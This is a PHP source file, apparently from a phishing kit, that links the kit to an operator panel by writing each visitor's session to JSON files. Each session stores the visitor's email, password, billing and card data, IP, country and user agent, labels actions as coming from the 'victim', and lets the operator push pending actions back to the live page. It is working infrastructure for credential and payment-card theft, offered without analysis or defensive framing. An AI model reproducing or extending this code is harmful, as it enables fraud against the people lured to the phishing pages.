<?php
/**
 * Bridge between kit and panel — writes session data to panel/data/sessions/.
 * The panel reads these JSON files. The kit reads pending_action from them via answer.php.
 */

function _panelDir() {
    $dir = dirname(__DIR__) . '/panel/data/sessions';
    if (!is_dir($dir)) {
        @mkdir($dir, 0777, true);
        @mkdir(dirname(__DIR__) . '/panel/data/archive', 0777, true);
    }
    return $dir;
}

function _panelSessionFile() {
    $dir = _panelDir();
    if (!$dir) return null;
    $id = $_SESSION['panel_session_id'] ?? null;
    if (!$id) return null;
    return $dir . '/' . $id . '.json';
}

function panelSessionInit($kit, $ip, $country = '') {
    $dir = _panelDir();
    if (!$dir) return;
    $id = bin2hex(random_bytes(8));
    $_SESSION['panel_session_id'] = $id;
    $data = [
        'id' => $id,
        'kit' => $kit,
        'ip' => $ip,
        'country' => $country,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'email' => '',
        'password' => '',
        'billing_data' => null,
        'card_data' => null,
        'status' => 'active',
        'current_step' => 'visit',
        'steps' => [['step' => 'visit', 'at' => time()]],
        'actions' => [],
        'is_online' => true,
        'extra_data' => null,
        'created_at' => time(),
        'updated_at' => time(),
    ];
    $file = $dir . '/' . $id . '.json';
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function panelSessionUpdate($fields) {
    $file = _panelSessionFile();
    if (!$file || !file_exists($file)) return;
    $data = json_decode(file_get_contents($file), true);
    if (!$data) return;
    foreach ($fields as $k => $v) $data[$k] = $v;
    $data['updated_at'] = time();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function panelSessionAddStep($step) {
    $file = _panelSessionFile();
    if (!$file || !file_exists($file)) return;
    $data = json_decode(file_get_contents($file), true);
    if (!$data) return;
    $data['steps'][] = ['step' => $step, 'at' => time()];
    $data['current_step'] = $step;
    $data['updated_at'] = time();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function panelSessionAddAction($type, $detail, $by = 'victim') {
    $file = _panelSessionFile();
    if (!$file || !file_exists($file)) return;
    $data = json_decode(file_get_contents($file), true);
    if (!$data) return;
    $data['actions'][] = ['type' => $type, 'detail' => $detail, 'by' => $by, 'at' => time()];
    $data['updated_at'] = time();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}

function panelGetPendingAction() {
    $file = _panelSessionFile();
    if (!$file || !file_exists($file)) return null;
    $data = json_decode(file_get_contents($file), true);
    if (!$data || empty($data['pending_action'])) return null;

    $action = $data['pending_action'];
    $custom = $data['pending_custom'] ?? null;

    unset($data['pending_action']);
    unset($data['pending_custom']);
    $data['updated_at'] = time();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);

    return ['action' => $action, 'custom' => $custom];
}

function panelHeartbeat() {
    $file = _panelSessionFile();
    if (!$file || !file_exists($file)) return;
    $data = json_decode(file_get_contents($file), true);
    if (!$data) return;
    $data['is_online'] = true;
    $data['updated_at'] = time();
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
}
